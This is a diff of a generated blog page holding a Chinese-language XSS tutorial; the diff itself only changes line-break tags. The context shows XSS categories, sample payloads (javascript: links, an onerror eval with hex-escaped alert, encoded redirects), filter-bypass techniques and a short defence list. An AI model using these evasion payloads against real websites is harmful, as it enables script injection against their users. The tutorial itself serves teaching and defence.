@@ -302,10 +302,10 @@
 <h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>又称持久型XSS,威胁要比反射型XSS要大,存储在目标服务器中.</p>
 <p>用户不需要点击特定的url就可与执行，攻击者事先把恶意代码上传或存储到服务器中，受害者只需点开这个含有恶意代码的页面j就会执行恶意代码，通常可以使用一些网上的xss平台.</p>
 <p>此类XSS常出现在网站留言评论等交互处.</p>
-<br/>
+<br>
 
 <h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM-Based XSS基于DOM文档对象的一种漏洞，是一种特殊类型的反射型XSS.DOM型XSS基于JS上，不需要与服务器进行交互。</p>
-<br/>
+<br>
 
 <h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a><code>&lt;a&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -323,9 +323,9 @@
 
 <h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/ , /符号 ，</span><br></pre></td></tr></table></figure>
 
-<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><br/>
+<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><br>
 
-<br/>
+<br>
 
 <h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
 <li>HTML实体编码</li>
@@ -371,7 +371,7 @@
 </ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> =&gt; 3C7363726970743E616C657274282278737322293B3C2F7363726970743E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <h3 id="过滤url"><a href="#过滤url" class="headerlink" title="过滤url"></a>过滤url</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -395,7 +395,7 @@
 </ul>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><ul>
 <li>黑/白名单</li>
@@ -417,13 +417,13 @@
 <li><p>CSP(Content Security Policy)</p>
 </li>
 </ul>
-<br/>
+<br>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
-<br/>
+<br>
 
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p>
